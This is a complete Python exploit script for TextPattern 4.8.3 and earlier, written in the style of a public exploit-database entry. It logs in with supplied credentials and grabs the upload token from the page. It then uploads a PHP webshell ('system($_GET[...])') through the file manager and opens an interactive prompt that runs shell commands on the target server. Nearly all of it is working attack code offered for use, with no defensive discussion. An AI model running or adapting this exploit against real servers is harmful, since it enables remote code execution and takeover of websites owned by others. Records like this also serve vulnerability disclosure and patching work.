#!/usr/bin/python3

# Exploit Title: TextPattern <= 4.8.3 - Authenticated Remote Code Execution via Unrestricted File Upload
# Google Dork: N/A
# Date: 16/10/2020
# Exploit Author: Michele '0blio_' Cisternino
# Vendor Homepage: https://textpattern.com/
# Software Link: https://github.com/textpattern/textpattern
# Version: <= 4.8.3
# Tested on: Kali Linux x64
# CVE: N/A

import sys
import json
import requests
from bs4 import BeautifulSoup as bs4
from time import sleep
import random
import string
import readline

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Simple Terminal User Interface class I wrote to print run-time logs and headers
class Tui ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.blue = '\033[94m'
        self.yellow = '\033[93m'
        self.pink = '\033[95m'
        self.end = '\033[0m'
        self.bold = '\033[1m'

    def header (self, software, author, cve='N/A'):
        print ("\n", "{}Software:{} {}".format(self.pink, self.end, software), sep='')
        print ("{}CVE:{} {}".format(self.pink, self.end, cve))
        print ("{}Author:{} {}\n".format(self.pink, self.end, author))

    def info (self, message):
        print ("[{}*{}] {}".format(self.blue, self.end, message))

    def greatInfo (self, message):
        print ("[{}*{}] {}{}{}".format(self.blue, self.end, self.bold, message, self.end))

    def success (self, message):
        print ("[{}✓{}] {}{}{}".format(self.green, self.end, self.bold, message, self.end))

    def warning (self, message):
        print ("[{}!{}] {}".format(self.yellow, self.end, message))

    def error (self, message):
        print ("[{}✗{}] {}".format(self.red, self.end, message))

log = Tui()
log.header (software="TextPattern <= 4.8.3", cve="CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload", author="Michele '0blio_' Cisternino")

if len(sys.argv) < 4:
    log.info ("USAGE: python3 exploit.py http://target.com username password")
    log.info ("EXAMPLE: python3 exploit.py http://localhost admin admin\n")
    sys.exit()

# Get input from the command line
target, username, password = sys.argv[1:4]

# Fixing URL
target = target.strip()
if not target.startswith("https://") and not target.startswith("http://"):
    target = "http://" + target
if not target.endswith("/"):
    target = target + "/"

accessData = {'p_userid':username, 'p_password':password, '_txp_token':""}

# Login
log.info ("Authenticating to the target as '{}'".format(username))
s = requests.Session()
try:
    r = s.post(target + "textpattern/index.php", data=accessData, verify=False)
    sleep(1)
    if r.status_code == 200:
        log.success ("Logged in as '{}' (Cookie: txp_login={}; txp_login_public={})".format(username, s.cookies['txp_login'], s.cookies['txp_login_public']))
        sleep(1)

        # Parsing the response to find the upload token inside the main json array
        log.info ("Grabbing _txp_token (required to proceed with exploitation)..")
        soup = bs4(r.text, 'html.parser')
        scriptJS = soup.find_all("script")[2].string.replace("var textpattern = ", "")[:-2]
        scriptJS = json.loads(scriptJS)
        uploadToken = scriptJS['_txp_token']
        log.greatInfo ("Upload token grabbed successfully ({})".format(uploadToken))

    # The server reply with a 401 with the user provide wrong creds as input
    elif r.status_code == 401:
        log.error ("Unable to login. You provided wrong credentials..\n")
        sys.exit()
except requests.exceptions.ConnectionError:
    log.error ("Unable to connect to the target!")
    sys.exit()

# Crafting the upload request here
headers = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Accept" : "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01",
    "Accept-Encoding" : "gzip, deflate",
    "X-Requested-With" : "XMLHttpRequest",
    "Connection" : "close",
}

# Generating random webshell name
randomFilename = ''.join(random.choice(string.ascii_letters) for i in range(10)) + '.php'

# Mapping multiparts here
multipart_form_data = {
    "fileInputOrder" : (None, '1/1'),
    "app_mode" : (None, 'async'),
    "MAX_FILE_SIZE" : (None, '2000000'),
    "event" : (None, 'file'),
    "step" : (None, 'file_insert'),
    "id" : (None, ' '),
    "_txp_token" : (None, uploadToken), # Token here
    "thefile[]" : (randomFilename, '<?php system($_GET["efcd"]); ?>') # lol
}

# Uploading the webshell
log.warning ("Sending payload..")

try:
    r = s.post (target + "textpattern/index.php?event=file", verify=False, headers=headers, files=multipart_form_data)
    if "Files uploaded" in r.text:
        log.success ("Webshell uploaded successfully as {}".format(randomFilename))
except:
    log.error ("Unexpected error..")
    sys.exit()

sleep(2)

# Interact with the webshell (using the readline library to save the history of the executed commands at run-time)
log.greatInfo ("Interacting with the HTTP webshell..")
sleep (1)
print()

while 1:
    try:
        cmd = input ("\033[4m\033[91mwebshell\033[0m > ")
        if cmd == 'exit':
            raise KeyboardInterrupt
        r = requests.get (target + "files/" + randomFilename + "?efcd=" + cmd, verify=False)
        print (r.text)
    except KeyboardInterrupt:
        log.warning ("Stopped.")
        exit()
    except:
        log.error ("Unexpected error..")
        sys.exit()

print()